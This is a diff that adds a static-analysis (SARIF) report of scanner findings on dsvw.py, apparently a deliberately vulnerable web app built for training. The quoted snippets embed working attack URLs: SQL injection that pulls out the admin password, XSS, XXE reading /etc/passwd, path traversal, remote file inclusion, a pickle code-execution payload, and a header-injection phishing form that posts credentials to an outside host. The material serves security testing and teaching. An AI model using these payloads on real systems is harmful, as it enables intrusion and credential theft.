+                "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable."
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "note"
+              },
+              "help": {
+                "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable.\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable.\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "e04430a1-4843-3816-9c34-7a94eb2b9d14",
+              "name": "resources.rules.python.dlint-catastrophic-redos",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.dlint-catastrophic-redos"
+              },
+              "fullDescription": {
+                "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "error"
+              },
+              "help": {
+                "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/](https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/)\n - [https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/](https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            }
+          ],
+          "language": "en-US",
+          "contents": [
+            "localizedData",
+            "nonLocalizedData"
+          ],
+          "isComprehensive": false
+        }
+      },
+      "language": "en-US",
+      "results": [
+        {
+          "ruleId": "8ed02f3e-4bf1-3a33-94ae-439d5411415a",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 10,
+                  "startColumn": 1,
+                  "endLine": 10,
+                  "endColumn": 1262,
+                  "snippet": {
+                    "text": "HTML_PREFIX, HTML_POSTFIX = \"<!DOCTYPE html>\\n<html>\\n<head>\\n<style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style>\\n<title>%s</title>\\n</head>\\n<body style='font: 12px monospace'>\\n<script>function process(data) {alert(\\\"Surname(s) from JSON results: \\\" + Object.keys(data).map(function(k) {return data[k]}));}; var index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div style=\\\"position: absolute; top: 5px; right: 5px;\\\">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>');</script>\\n\" % html.escape(NAME), \"<div style=\\\"position: fixed; bottom: 5px; text-align: center; width: 100%%;\\\">Powered by <a href=\\\"%s\\\" style=\\\"font-weight: bold; text-decoration: none; visited: blue; color: blue\\\" target=\\\"_blank\\\">%s</a> (v<b>%s</b>)</div>\\n</body>\\n</html>\" % (GITHUB, re.search(r\"\\(([^)]+)\", NAME).group(1), VERSION)"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "5a9f93aace5af11a9887044659983addbf7d674037a097b570a752bf7d8d6922e7f3c6ec633206396893673f645646488726b16f5bb99d7a1ada9bcf065e07a8_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "9d8ac483-fe1b-3ff3-9291-728cb04ea3af",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Regex `r\"\\(([^)]+)\"` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 10,
+                  "startColumn": 1214,
+                  "endLine": 10,
+                  "endColumn": 1243,
+                  "snippet": {
+                    "text": "HTML_PREFIX, HTML_POSTFIX = \"<!DOCTYPE html>\\n<html>\\n<head>\\n<style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style>\\n<title>%s</title>\\n</head>\\n<body style='font: 12px monospace'>\\n<script>function process(data) {alert(\\\"Surname(s) from JSON results: \\\" + Object.keys(data).map(function(k) {return data[k]}));}; var index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div style=\\\"position: absolute; top: 5px; right: 5px;\\\">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>');</script>\\n\" % html.escape(NAME), \"<div style=\\\"position: fixed; bottom: 5px; text-align: center; width: 100%%;\\\">Powered by <a href=\\\"%s\\\" style=\\\"font-weight: bold; text-decoration: none; visited: blue; color: blue\\\" target=\\\"_blank\\\">%s</a> (v<b>%s</b>)</div>\\n</body>\\n</html>\" % (GITHUB, re.search(r\"\\(([^)]+)\", NAME).group(1), VERSION)"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "e05eed8057c36744738dd549aaad2707b9ad706e733ab4baa2db326925f9b7af5791e51fdf04f3aa10da0dc72925a6fe078dfce9c9d4af6f5cb89cbb0e98f1b1_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "2ffd144c-0cc1-3003-8e66-ccdfedb605cd",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Found use of the native Python XML libraries, which is vulnerable to XML external entity (XXE)\nattacks. The Python documentation recommends the 'defusedxml' library instead. Use 'defusedxml'.\nSee https://github.com/tiran/defusedxml for more information.\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 2,
+                  "startColumn": 1,
+                  "endLine": 2,
+                  "endColumn": 198,
+                  "snippet": {
+                    "text": "import html, http.client, http.server, io, json, os, pickle, random, re, socket, socketserver, sqlite3, string, sys, subprocess, time, traceback, urllib.parse, urllib.request, xml.etree.ElementTree  # Python 3 required"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "03371f666f81ee42dd1a792d71c1df0da7353d7b7e5fffe6af6ee710bfeeb2714452392e14b3c77bb8553b6508a710a54685159b9bf173554aa9a5d0bed81eff_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "33e5134c-66d8-3a8e-b73f-73bafacbb944",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Minified, compressed, obfuscated or any other form of unreadable files is excluded from the scan, because although a strong indicator of maliciousness, its FP rate is relatively higher. It is highly recommended to store such files in CDN, cloud buckets, etc. and keep the codebase readable."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 11,
+                  "startColumn": 1,
+                  "endLine": 11,
+                  "endColumn": 546,
+                  "snippet": {
+                    "text": "USERS_XML = \"\"\"<?xml version=\"1.0\" encoding=\"utf-8\"?><users><user id=\"0\"><username>admin</username><name>admin</name><surname>admin</surname><password>7en8aiDoh!</password></user><user id=\"1\"><username>dricci</username><name>dian</name><surname>ricci</surname><password>12345</password></user><user id=\"2\"><username>amason</username><name>anthony</name><surname>mason</surname><password>gandalf</password></user><user id=\"3\"><username>svargas</username><name>sandra</name><surname>vargas</surname><password>phest1945</password></user></users>\"\"\""
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "5a9f93aace5af11a9887044659983addbf7d674037a097b570a752bf7d8d6922e7f3c6ec633206396893673f645646488726b16f5bb99d7a1ada9bcf065e07a8_1"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "c3e53eb6-70f1-3dd8-bd43-7bfd04bf2834",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Avoid using `pickle`, which is known to lead to code execution vulnerabilities. When unpickling, the serialized data could be manipulated to run arbitrary code. Instead, consider serializing the relevant data as JSON or a similar text-based serialization format."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 12,
+                  "startColumn": 9202,
+                  "endLine": 12,
+                  "endColumn": 9360,
+                  "snippet": {
+                    "text": "CASES = ((\"Blind SQL Injection (<i>boolean</i>)\", \"?id=2\", \"/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27\\\" onclick=\\\"alert('checking if the first character for admin\\\\'s password is digit \\\\'7\\\\' (true in case of same result(s) as for \\\\'vulnerable\\\\')')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique\"), (\"Blind SQL Injection (<i>time</i>)\", \"?id=2\", \"/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\\\" onclick=\\\"alert('checking if the second character for admin\\\\'s password is letter \\\\'e\\\\' (true in case of delayed response)')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique\"), (\"UNION SQL Injection\", \"?id=2\", \"/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique\"), (\"Login Bypass\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%20OR%20%271%27%20LIKE%20%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#classic-sql-injection\"), (\"HTTP Parameter Pollution\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%2F*&amp;password=*%2FOR%2F*&amp;password=*%2F%271%27%2F*&amp;password=*%2FLIKE%2F*&amp;password=*%2F%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution\"), (\"Cross Site Scripting (<i>reflected</i>)\", \"/?v=0.4\", \"/?v=0.4%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>stored</i>)\", \"/?comment=\\\" onclick=\\\"document.location='/?comment='+prompt('please leave a comment'); return false\", \"/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>DOM</i>)\", \"/?#lang=en\", \"/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>JSONP</i>)\", \"/users.json?callback=process\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=process';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"http://www.metaltoad.com/blog/using-jsonp-safely\"), (\"XML External Entity (<i>local</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\" if os.name != \"nt\" else \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"XML External Entity (<i>remote</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fhttpbin.org%2Fbase64%2FSGVsbG8sIFdvcmxkIQ%3D%3D%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"Server Side Request Forgery\", \"/?path=\", \"/?path=http%3A%2F%2F127.0.0.1%3A631\" if os.name != \"nt\" else \"/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini\", \"http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/\"), (\"Blind XPath Injection (<i>boolean</i>)\", \"/?name=dian\", \"/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n\\\" onclick=\\\"alert('checking if the third character for admin\\\\'s password is letter \\\\'n\\\\' (true in case of found item)')\", \"https://owasp.org/www-community/attacks/XPATH_Injection\"), (\"Cross Site Request Forgery\", \"/?comment=\", \"/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E\\\" onclick=\\\"alert('please visit \\\\'vulnerable\\\\' page to see what this click has caused')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\"), (\"Frame Injection (<i>phishing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Frame Injection (<i>content spoofing</i>)\", \"/?v=0.4\", \"/?v=0.4%3Ciframe%20src%3D%22https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fframe.html%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E\", \"http://www.gnucitizen.org/blog/frame-injection-fun/\"), (\"Clickjacking\", None, \"/?v=0.4%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27https%3A%2F%2Fdemo.sekuripy.hr%2Fdsvw%2Fclickjacking.html%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking\"), (\"Unvalidated Redirect\", \"/?redir=\", \"/?redir=https%3A%2F%2Fgeekprank.com%2F\", \"https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\"), (\"Arbitrary Code Execution\", \"/?domain=www.google.com\", \"/?domain=www.google.com%3B%20ifconfig\" if os.name != \"nt\" else \"/?domain=www.google.com%26%20ipconfig\", \"https://en.wikipedia.org/wiki/Arbitrary_code_execution\"), (\"Full Path Disclosure\", \"/?path=\", \"/?path=foobar\", \"https://owasp.org/www-community/attacks/Full_Path_Disclosure\"), (\"Source Code Disclosure\", \"/?path=\", \"/?path=dsvw.py\", \"https://www.imperva.com/resources/glossary?term=source_code_disclosure\"), (\"Path Traversal\", \"/?path=\", \"/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\" if os.name != \"nt\" else \"/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini\", \"https://www.owasp.org/index.php/Path_Traversal\"), (\"File Inclusion (<i>remote</i>)\", \"/?include=\", \"/?include=https%%3A%%2F%%2Fpastebin.com%%2Fraw%%2F6VyyNNhc&amp;cmd=%s\" % (\"ifconfig\" if os.name != \"nt\" else \"ipconfig\"), \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion\"), (\"HTTP Header Injection (<i>phishing</i>)\", \"/?charset=utf8\", \"/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E\", \"https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection\"), (\"Component with Known Vulnerability (<i>pickle</i>)\", \"/?object=%s\" % urllib.parse.quote(pickle.dumps(dict((_.findtext(\"username\"), (_.findtext(\"name\"), _.findtext(\"surname\"))) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))), \"/?object=cos%%0Asystem%%0A(S%%27%s%%27%%0AtR.%%0A\\\" onclick=\\\"alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')\" % urllib.parse.quote(\"ping -c 5 127.0.0.1\" if os.name != \"nt\" else \"ping -n 5 127.0.0.1\"), \"https://www.cs.uic.edu/~s/musings/pickle.html\"), (\"Denial of Service (<i>memory</i>)\", \"/?size=32\", \"/?size=9999999\", \"https://owasp.org/www-community/attacks/Denial_of_Service\"))"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "4339311549e81d5079cfb2fb4032a38b592c75d8b1df19c3557d5f8f01952f6c5bf01fa3f03287555dd852a61b84b547e9f7aa3ba76ec93cb1ac9446006b581f_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "0c0a706e-8aa5-3e3d-bfbd-df57892e349f",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Insecure XML parsing functionality, prefer 'defusedxml'"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 20,
+                  "startColumn": 211,
+                  "endLine": 20,
+                  "endColumn": 220,
+                  "snippet": {
+                    "text": "    cursor.executemany(\"INSERT INTO users(id, username, name, surname, password) VALUES(NULL, ?, ?, ?, ?)\", ((_.findtext(\"username\"), _.findtext(\"name\"), _.findtext(\"surname\"), _.findtext(\"password\")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\")))"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "56a3d1743f5b96a16147c608c467ae2ea2741410df8f3a936e6f33fa357c2c37b7906769a3c183b485fd1be666a89090ff29c38b7900f0f35ffb95af73d23872_1"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "f8302d05-340e-300e-bea8-63719dabe88b",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Regex `r\"(?:\\A|[?&])%s=([^&]+)\" % match.group(\"parameter\")` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 26,
+                  "startColumn": 132,
+                  "endLine": 26,
+                  "endColumn": 202,
+                  "snippet": {
+                    "text": "        code, content, params, cursor = http.client.OK, HTML_PREFIX, dict((match.group(\"parameter\"), urllib.parse.unquote(','.join(re.findall(r\"(?:\\A|[?&])%s=([^&]+)\" % match.group(\"parameter\"), query)))) for match in re.finditer(r\"((\\A|[?&])(?P<parameter>[\\w\\[\\]]+)=)([^&]+)\", query)), connection.cursor()"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "83f6e93a6b46a72b86c2106f2457e2920a3ba1b8516b5503915afab9b340a17ffe8659ec97d3ff39bce61c07c2654fd0135653a55dbc0ba0001eae0368c83651_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "b24763e6-3ddd-3bba-8502-239df941ee54",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Insecure XML parsing functionality, prefer 'defusedxml'"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "dsvw.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 12,
+                  "startColumn": 9299,
+                  "endLine": 12,
+                  "endColumn": 9308,
+                  "snippet": {
+                    "text": "CASES = ((\"Blind SQL Injection (<i>boolean</i>)\", \"?id=2\", \"/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27\\\" onclick=\\\"alert('checking if the first character for admin\\\\'s password is digit \\\\'7\\\\' (true in case of same result(s) as for \\\\'vulnerable\\\\')')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique\"), (\"Blind SQL Injection (<i>time</i>)\", \"?id=2\", \"/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\\\" onclick=\\\"alert('checking if the second character for admin\\\\'s password is letter \\\\'e\\\\' (true in case of delayed response)')\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique\"), (\"UNION SQL Injection\", \"?id=2\", \"/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique\"), (\"Login Bypass\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%20OR%20%271%27%20LIKE%20%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#classic-sql-injection\"), (\"HTTP Parameter Pollution\", \"/login?username=&amp;password=\", \"/login?username=admin&amp;password=%27%2F*&amp;password=*%2FOR%2F*&amp;password=*%2F%271%27%2F*&amp;password=*%2FLIKE%2F*&amp;password=*%2F%271\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution\"), (\"Cross Site Scripting (<i>reflected</i>)\", \"/?v=0.4\", \"/?v=0.4%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>stored</i>)\", \"/?comment=\\\" onclick=\\\"document.location='/?comment='+prompt('please leave a comment'); return false\", \"/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>DOM</i>)\", \"/?#lang=en\", \"/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting\"), (\"Cross Site Scripting (<i>JSONP</i>)\", \"/users.json?callback=process\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=process';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess\\\" onclick=\\\"var script=document.createElement('script');script.src='/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess';document.getElementsByTagName('head')[0].appendChild(script);return false\", \"http://www.metaltoad.com/blog/using-jsonp-safely\"), (\"XML External Entity (<i>local</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\" if os.name != \"nt\" else \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"XML External Entity (<i>remote</i>)\", \"/?xml=%3Croot%3E%3C%2Froot%3E\", \"/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fhttpbin.org%2Fbase64%2FSGVsbG8sIFdvcmxkIQ%3D%3D%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E\", \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection\"), (\"Server Side Request Forgery\", 